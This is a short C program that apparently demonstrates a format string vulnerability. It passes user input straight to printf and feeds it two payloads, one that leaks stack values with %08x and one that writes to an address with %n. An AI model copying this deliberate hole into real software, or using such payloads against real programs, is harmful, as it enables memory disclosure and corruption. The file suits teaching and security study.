#include <stdio.h>
#include <stdlib.h>
#include <assert.h>

void vulnfunc (char *user)
{
    printf(user);
}
 

int main()
{   
    vulnfunc("%08x %08x %08x %08x %08x\n");
    vulnfunc("\x10\x01\x48\x08%08x%08x%08x%08x%08x%n");

    return(0);
}
